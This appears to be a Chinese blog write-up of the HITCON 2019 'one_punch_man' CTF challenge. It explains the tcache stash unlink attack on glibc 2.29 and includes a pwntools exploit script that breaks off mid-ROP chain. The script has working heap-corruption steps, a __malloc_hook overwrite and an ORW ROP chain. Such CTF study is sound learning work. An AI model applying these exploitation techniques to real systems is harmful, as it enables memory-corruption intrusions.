@@ -1,0 +1,179 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>BUU-hitcon_ctf_2019_one_punch_man-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="许久没做题了，今天花了半天的时间学习了一下 Tcache stash unlink attack 这种利用方式，做了一下 hitcon 的这道题。 其实第一次碰到这道题是在 hctf-game final 的时候，语神给这道题套了一个"><meta property="og:image" content><meta property="og:title" content="BUU-hitcon_ctf_2019_one_punch_man-WP"><meta property="og:description" content="许久没做题了，今天花了半天的时间学习了一下 Tcache stash unlink attack 这种利用方式，做了一下 hitcon 的这道题。 其实第一次碰到这道题是在 hctf-game final 的时候，语神给这道题套了一个"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/1226.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-03-28T16:49:00+00:00"><meta property="article:modified_time" content="2021-03-28T16:49:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="BUU-hitcon_ctf_2019_one_punch_man-WP"><meta name=twitter:description content="许久没做题了，今天花了半天的时间学习了一下 Tcache stash unlink attack 这种利用方式，做了一下 hitcon 的这道题。 其实第一次碰到这道题是在 hctf-game final 的时候，语神给这道题套了一个"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>BUU-hitcon_ctf_2019_one_punch_man-WP</h1><div class=meta>Posted on Mar 28, 2021</div></div><section class=body><p>许久没做题了，今天花了半天的时间学习了一下 <strong>Tcache stash unlink attack</strong> 这种利用方式，做了一下 hitcon 的这道题。</p><p>其实第一次碰到这道题是在 hctf-game final 的时候，语神给这道题套了一个 php 的壳当成 webpwn 出了出来，当时由于不知道该怎么 leak（由于外面套了一层 php，内部堆的结构非常混乱而且易变）就没有做出来。一直没有复现，解一下这题也就当复现了吧。</p><p>漏洞点非常多</p><ul><li>rename 可以 UAF</li><li>retire 可以 double free</li><li>show 可以 leak 许多东西</li><li>存在一个后门函数可以使用 malloc 申请空间</li></ul><p>leak 堆和 libc 的基址非常容易，申请两个大小相同的堆块再 free 掉，通过 show 函数可以泄露出 fd 指针的值，简单计算一下就可以获得基址。</p><p>由于 calloc 不会从 tcache 中取出堆块，所以多次申请和释放就可以填满 tcahce，再申请释放就可以 leak 出 <code>&amp;main_arena + 96</code> 了，然后就可以算出 libc_base。</p><p>这些都算出来后，结合 UAF 的漏洞，只要有一个 malloc 就可以通过 tcache poisoning 实现对 __malloc_hook 的任意写了。但是 debut 函数使用的是 calloc，只有使用后门函数才可以实现对 malloc 的调用。而要执行后门函数</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/03/2711865065.png></div><p>必须满足 <code>*(qword_4030 + 32) > 6</code>，而 qword_4030 中存储的是 tcache_ptread_struct 的地址，也就是要满足大小为 0x20 的 tcache 链中要有 6 个以上的 bins，而我们分配不出这个大小的 chunk。做法其实有许多，这里只说 <strong>Tcache stash unlink attack</strong> 的做法。</p><h3 id=tcache-stash-unlink-attack>Tcache stash unlink attack</h3><p>其实要满足的就是要使一个确定的地址上的值为一个较大的值，自然的，使用 <code>unsorted bin attack</code> 是首选，但是在 glibc 2.29 下</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>while</span> ((victim <span style=color:#666>=</span> unsorted_chunks (av)<span style=color:#666>-&gt;</span>bk) <span style=color:#666>!=</span> unsorted_chunks (av))
+</span></span><span style=display:flex><span>       {
+</span></span><span style=display:flex><span>         bck <span style=color:#666>=</span> victim<span style=color:#666>-&gt;</span>bk;
+</span></span><span style=display:flex><span>         size <span style=color:#666>=</span> chunksize (victim);
+</span></span><span style=display:flex><span>         mchunkptr next <span style=color:#666>=</span> chunk_at_offset (victim, size);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>         <span style=color:#007020;font-weight:700>if</span> (__glibc_unlikely (size <span style=color:#666>&lt;=</span> <span style=color:#40a070>2</span> <span style=color:#666>*</span> SIZE_SZ)
+</span></span><span style=display:flex><span>             <span style=color:#666>||</span> __glibc_unlikely (size <span style=color:#666>&gt;</span> av<span style=color:#666>-&gt;</span>system_mem))
+</span></span><span style=display:flex><span>           malloc_printerr (<span style=color:#4070a0>&#34;malloc(): invalid size (unsorted)&#34;</span>);
+</span></span><span style=display:flex><span>         <span style=color:#007020;font-weight:700>if</span> (__glibc_unlikely (chunksize_nomask (next) <span style=color:#666>&lt;</span> <span style=color:#40a070>2</span> <span style=color:#666>*</span> SIZE_SZ)
+</span></span><span style=display:flex><span>             <span style=color:#666>||</span> __glibc_unlikely (chunksize_nomask (next) <span style=color:#666>&gt;</span> av<span style=color:#666>-&gt;</span>system_mem))
+</span></span><span style=display:flex><span>           malloc_printerr (<span style=color:#4070a0>&#34;malloc(): invalid next size (unsorted)&#34;</span>);
+</span></span><span style=display:flex><span>         <span style=color:#007020;font-weight:700>if</span> (__glibc_unlikely ((prev_size (next) <span style=color:#666>&amp;</span> <span style=color:#666>~</span>(SIZE_BITS)) <span style=color:#666>!=</span> size))
+</span></span><span style=display:flex><span>           malloc_printerr (<span style=color:#4070a0>&#34;malloc(): mismatching next-&gt;prev_size (unsorted)&#34;</span>);
+</span></span><span style=display:flex><span>         <span style=color:#007020;font-weight:700>if</span> (__glibc_unlikely (bck<span style=color:#666>-&gt;</span>fd <span style=color:#666>!=</span> victim)
+</span></span><span style=display:flex><span>             <span style=color:#666>||</span> __glibc_unlikely (victim<span style=color:#666>-&gt;</span>fd <span style=color:#666>!=</span> unsorted_chunks (av)))
+</span></span><span style=display:flex><span>           malloc_printerr (<span style=color:#4070a0>&#34;malloc(): unsorted double linked list corrupted&#34;</span>);
+</span></span><span style=display:flex><span>         <span style=color:#007020;font-weight:700>if</span> (__glibc_unlikely (prev_inuse (next)))
+</span></span><span style=display:flex><span>           malloc_printerr (<span style=color:#4070a0>&#34;malloc(): invalid next-&gt;prev_inuse (unsorted)&#34;</span>);
+</span></span></code></pre></div><p>增加了大量检查，使得 <code>unsorted bin attack</code> 几乎无法使用，所以就要用到 stash 机制了。</p><p>这个机制存在于简单的说，就是尽可能的把 chunk 放到 tcache 中，但是在从其他的 bin 中解链的时候，欠缺检查。以 small bin 为例，分配给用户后，还会继续把队列上的 small bin 放入大小对应的 tcache 中，直到 tcache 被填满或者 small bin 被拿空。下面从代码上来看</p><p>以下是分配器处理 small request 的时候，遍历对应的 small bin 的过程</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>if</span> (in_smallbin_range (nb))
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      idx <span style=color:#666>=</span> smallbin_index (nb);
+</span></span><span style=display:flex><span>      bin <span style=color:#666>=</span> bin_at (av, idx);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> ((victim <span style=color:#666>=</span> last (bin)) <span style=color:#666>!=</span> bin)
+</span></span><span style=display:flex><span>        {
+</span></span><span style=display:flex><span>          bck <span style=color:#666>=</span> victim<span style=color:#666>-&gt;</span>bk;
+</span></span><span style=display:flex><span>	  <span style=color:#007020;font-weight:700>if</span> (__glibc_unlikely (bck<span style=color:#666>-&gt;</span>fd <span style=color:#666>!=</span> victim))
+</span></span><span style=display:flex><span>	    malloc_printerr (<span style=color:#4070a0>&#34;malloc(): smallbin double linked list corrupted&#34;</span>);
+</span></span><span style=display:flex><span>          set_inuse_bit_at_offset (victim, nb);
+</span></span><span style=display:flex><span>          bin<span style=color:#666>-&gt;</span>bk <span style=color:#666>=</span> bck;
+</span></span><span style=display:flex><span>          bck<span style=color:#666>-&gt;</span>fd <span style=color:#666>=</span> bin;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>          <span style=color:#007020;font-weight:700>if</span> (av <span style=color:#666>!=</span> <span style=color:#666>&amp;</span>main_arena)
+</span></span><span style=display:flex><span>	    set_non_main_arena (victim);
+</span></span><span style=display:flex><span>          check_malloced_chunk (av, victim, nb);
+</span></span><span style=display:flex><span><span style=color:#007020>#if USE_TCACHE
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>	  <span style=color:#60a0b0;font-style:italic>/* While we&#39;re here, if we see other chunks of the same size,
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	     stash them in the tcache.  */</span>
+</span></span><span style=display:flex><span>	  size_t tc_idx <span style=color:#666>=</span> csize2tidx (nb);
+</span></span><span style=display:flex><span>	  <span style=color:#007020;font-weight:700>if</span> (tcache <span style=color:#666>&amp;&amp;</span> tc_idx <span style=color:#666>&lt;</span> mp_.tcache_bins)
+</span></span><span style=display:flex><span>	    {
+</span></span><span style=display:flex><span>	      mchunkptr tc_victim;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	      <span style=color:#60a0b0;font-style:italic>/* While bin not empty and tcache not full, copy chunks over.  */</span>
+</span></span><span style=display:flex><span>	      <span style=color:#007020;font-weight:700>while</span> (tcache<span style=color:#666>-&gt;</span>counts[tc_idx] <span style=color:#666>&lt;</span> mp_.tcache_count
+</span></span><span style=display:flex><span>		     <span style=color:#666>&amp;&amp;</span> (tc_victim <span style=color:#666>=</span> last (bin)) <span style=color:#666>!=</span> bin)
+</span></span><span style=display:flex><span>		{
+</span></span><span style=display:flex><span>		  <span style=color:#007020;font-weight:700>if</span> (tc_victim <span style=color:#666>!=</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>		    {
+</span></span><span style=display:flex><span>		      bck <span style=color:#666>=</span> tc_victim<span style=color:#666>-&gt;</span>bk;
+</span></span><span style=display:flex><span>		      set_inuse_bit_at_offset (tc_victim, nb);
+</span></span><span style=display:flex><span>		      <span style=color:#007020;font-weight:700>if</span> (av <span style=color:#666>!=</span> <span style=color:#666>&amp;</span>main_arena)
+</span></span><span style=display:flex><span>			set_non_main_arena (tc_victim);
+</span></span><span style=display:flex><span>		      bin<span style=color:#666>-&gt;</span>bk <span style=color:#666>=</span> bck;
+</span></span><span style=display:flex><span>		      bck<span style=color:#666>-&gt;</span>fd <span style=color:#666>=</span> bin;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		      tcache_put (tc_victim, tc_idx);
+</span></span><span style=display:flex><span>	            }
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>	    }
+</span></span><span style=display:flex><span><span style=color:#007020>#endif
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>          <span style=color:#902000>void</span> <span style=color:#666>*</span>p <span style=color:#666>=</span> chunk2mem (victim);
+</span></span><span style=display:flex><span>          alloc_perturb (p, bytes);
+</span></span><span style=display:flex><span>          <span style=color:#007020;font-weight:700>return</span> p;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>如果 small bin 中有 best fit，就会进行下面这一段是处理分配，也就是将 small bin 的队尾的 chunk 解链，之后返回给用户</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> ((victim <span style=color:#666>=</span> last (bin)) <span style=color:#666>!=</span> bin)
+</span></span><span style=display:flex><span>        {
+</span></span><span style=display:flex><span>          bck <span style=color:#666>=</span> victim<span style=color:#666>-&gt;</span>bk;
+</span></span><span style=display:flex><span>	  <span style=color:#007020;font-weight:700>if</span> (__glibc_unlikely (bck<span style=color:#666>-&gt;</span>fd <span style=color:#666>!=</span> victim))
+</span></span><span style=display:flex><span>	    malloc_printerr (<span style=color:#4070a0>&#34;malloc(): smallbin double linked list corrupted&#34;</span>);
+</span></span><span style=display:flex><span>          set_inuse_bit_at_offset (victim, nb);
+</span></span><span style=display:flex><span>          bin<span style=color:#666>-&gt;</span>bk <span style=color:#666>=</span> bck;
+</span></span><span style=display:flex><span>          bck<span style=color:#666>-&gt;</span>fd <span style=color:#666>=</span> bin;
+</span></span></code></pre></div><p>如果没有 stash 机制，到这里就可以结束了。但是由于 stash 机制，剩下的 small chunk 也会被尽可能地放进对应大小的 tcache 中</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>                  <span style=color:#007020;font-weight:700>if</span> (tc_victim <span style=color:#666>!=</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>		    {
+</span></span><span style=display:flex><span>		      bck <span style=color:#666>=</span> tc_victim<span style=color:#666>-&gt;</span>bk;
+</span></span><span style=display:flex><span>		      set_inuse_bit_at_offset (tc_victim, nb);
+</span></span><span style=display:flex><span>		      <span style=color:#007020;font-weight:700>if</span> (av <span style=color:#666>!=</span> <span style=color:#666>&amp;</span>main_arena)
+</span></span><span style=display:flex><span>			set_non_main_arena (tc_victim);
+</span></span><span style=display:flex><span>		      bin<span style=color:#666>-&gt;</span>bk <span style=color:#666>=</span> bck;
+</span></span><span style=display:flex><span>		      bck<span style=color:#666>-&gt;</span>fd <span style=color:#666>=</span> bin;
+</span></span></code></pre></div><p>而这里没有进行检查，所以可以起到类似 <code>unsorted bin attack</code> 的效果，把一个较大的值写入一段地址中。要满足的条件就是控制一个 small bin 的 bk 指针。</p><p>下面引用<a href=https://zhuanlan.zhihu.com/p/136983333>此文章的总结</a></p><blockquote><p><strong>Tcache stash unlink attack</strong>，可以实现等价于 unsortedbin 的作用，即向任意地址写入一个不可控的大数字。其最核心操作，就是先放入 2 个 chunk 到 smallbin，6 个 chunk 到对应的 tcache 。之后在不破坏 fd 的情况下将后放入 smallbin 的 chunk 的 bk 设置为目标地址- 0x10 。这样当再向 smallbin 申请对应 size 的 chunk 时（一般用 calloc，因为 calloc 不请求 tcache ），先放入 smallbin 的 chunk 被分配给用户，然后触发 stash 机制。bck = tc_victim->bk; 此时的 bck 就是目标地址-0x10，之后 bck->fd = bin; 也就是*(目标地址-0x10+0x10) = bin，这样就实现了等价于 unsortedbin 的操作。之后调用 tcache_put 把后放入 smallbin 的 chunk 取出给对应的 tcache ，因为 tcache 之前已经被布置了 6 个 chunk ，这次 put 后达到了阈值，所以也就退出了这次 stash 循环，整个流程就可以正常结束了。</p></blockquote><p><em>tcache 中原本就要有 6 个 chunk 还是比较重要的，不然就会出现段错误。因为再一次循环时，我们 tc_victim 就等于我们想写的地址的值了，结合上面的代码可以看出是很容易出现段错误的。</em></p><hr><p>将目标地址覆写为较大值后，就可以 malloc 了，可以很容易地分配到 __malloc_hook 上</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/03/2892248269.png></div><p>但是本题开启了白名单，需要 orw 来获得 flag。</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/03/2403764996.png></div><p>注意到我们的输入是先存在栈上，之后再复制过去的，当 calloc 的时候，会调用 <code>__malloc_hook</code> 指向的代码，如果我们让它指向 <code>add rsp,0x·· ; ret</code> 就可以实现 rop 了。经过调试，<code>0x48</code> 就正好会跳转到我们的输入上。</p><p>很坑爹的是，libc 中 <code>open</code> 函数并不是用 <code>sys_open</code> 调用来实现的，而是 <code>sys_openat</code>（感谢这位师傅的<a href=https://orangegzy.github.io/2020/09/17/hitcon-ctf-2019-one-punch/>文章</a>）所以要通过 syscall 来实现 open。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#39;debug&#39;</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>,<span style=color:#4070a0>&#39;splitw&#39;</span>,<span style=color:#4070a0>&#39;-h&#39;</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./hitcon_ctf_2019_one_punch&#34;)</span>
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;node3.buuoj.cn&#34;</span>,<span style=color:#40a070>29896</span>)
+</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc-2.29.so&#34;</span>)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#libc = ELF(&#34;/glibc/2.27/amd64/lib/libc.so.6&#34;)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>debut</span>(payload,index):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt; &#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;idx: &#34;</span>,<span style=color:#007020>str</span>(index))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;hero name: &#34;</span>,payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>rename</span>(payload,index):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt; &#34;</span>,<span style=color:#4070a0>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;idx: &#34;</span>,<span style=color:#007020>str</span>(index))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;hero name: &#34;</span>,payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>show</span>(index):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt; &#34;</span>,<span style=color:#4070a0>&#39;3&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;idx: &#34;</span>,<span style=color:#007020>str</span>(index))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>retire</span>(index):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt; &#34;</span>,<span style=color:#4070a0>&#39;4&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;idx: &#34;</span>,<span style=color:#007020>str</span>(index))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>magic</span>(payload):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt; &#34;</span>,<span style=color:#4070a0>&#39;50056&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>send(payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>debut(<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0xF8</span>,<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>debut(<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0xF8</span>,<span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>retire(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>retire(<span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>show(<span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;: &#34;</span>)
+</span></span><span style=display:flex><span>heap_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00\x00</span><span style=color:#4070a0>&#39;</span>) <span style=color:#666>-</span> <span style=color:#40a070>0x260</span>
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;heap_base:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(heap_base))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>4</span>):
+</span></span><span style=display:flex><span>    debut(<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0xf8</span>,<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>    retire(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>7</span>):
+</span></span><span style=display:flex><span>    debut(<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x400</span>,<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>    retire(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>debut(<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x400</span>,<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>debut(<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x150</span>,<span style=color:#40a070>2</span>)
+</span></span><span style=display:flex><span>debut(<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x400</span>,<span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>retire(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>show(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;: &#34;</span>)
+</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00\x00</span><span style=color:#4070a0>&#39;</span>) <span style=color:#666>-</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;__malloc_hook&#34;</span>] <span style=color:#666>-</span> <span style=color:#40a070>0x10</span> <span style=color:#666>-</span> <span style=color:#40a070>96</span>
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
+</span></span><span style=display:flex><span>debut(<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x300</span>,<span style=color:#40a070>2</span>)
+</span></span><span style=display:flex><span>debut(<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x200</span>,<span style=color:#40a070>2</span>)<span style=color:#60a0b0;font-style:italic>#belong to idx:0</span>
+</span></span><span style=display:flex><span>retire(<span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>debut(<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x300</span>,<span style=color:#40a070>2</span>)
+</span></span><span style=display:flex><span>debut(<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x200</span>,<span style=color:#40a070>2</span>)<span style=color:#60a0b0;font-style:italic>#belong to idx:1</span>
+</span></span><span style=display:flex><span>debut(<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x217</span>,<span style=color:#40a070>2</span>)
+</span></span><span style=display:flex><span>retire(<span style=color:#40a070>2</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;/flag</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span><span style=color:#666>.</span>ljust(<span style=color:#40a070>0x300</span>,<span style=color:#4070a0>&#39;b&#39;</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x101</span>) <span style=color:#666>+</span> p64(heap_base <span style=color:#666>+</span> <span style=color:#40a070>0x27D0</span>) <span style=color:#666>+</span> p64(heap_base <span style=color:#666>+</span> <span style=color:#40a070>0x30</span> <span style=color:#666>-</span> <span style=color:#40a070>0x10</span> <span style=color:#666>-</span> <span style=color:#40a070>5</span>)
+</span></span><span style=display:flex><span>rename(payload,<span style=color:#40a070>1</span>) 
+</span></span><span style=display:flex><span>debut(<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0xF8</span>,<span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>__malloc_hook_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;__malloc_hook&#34;</span>]
+</span></span><span style=display:flex><span>rename(p64(__malloc_hook_addr),<span style=color:#40a070>2</span>)
+</span></span><span style=display:flex><span>magic(<span style=color:#4070a0>&#39;pass&#39;</span>)
+</span></span><span style=display:flex><span>magic(p64(libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x8cfd6</span>)) <span style=color:#60a0b0;font-style:italic># add rsp,0x48;ret</span>
+</span></span><span style=display:flex><span>pop_rdi_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x26542</span>
+</span></span><span style=display:flex><span>pop_rsi_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x26f9e</span>
+</span></span><span style=display:flex><span>pop_rdx_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x12bda6</span>
+</span></span><span style=display:flex><span>pop_rax_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x47cf8</span>
+</span></span><span style=display:flex><span>syscall_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0xcf6c5</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;&#39;</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(pop_rdi_ret) <span style=color:#666>+</span> p64(heap_base <span style=color:#666>+</span> <span style=color:#40a070>0x2A40</span>) 
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(pop_rsi_ret) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(pop_rdx_ret) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(pop_rax_ret) <span style=color:#666>+</span> p64(<span style=color:#40a070>2</span>) <span style=color:#666>+</span> p64(syscall_ret)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(pop_rdi_ret) <span style=color:#666>+</span> p64(<span style=color:#40a070>3</span>) <span style=color:#666>+</span> p64(pop_rsi_ret) <span style=color:#666>+</span> p64(heap_base) <span style=color:#666>+</span> p64(pop_rdx_ret) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x100</span>) <span style=color:#666>+</span> p64(libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;read&#34;</span>])
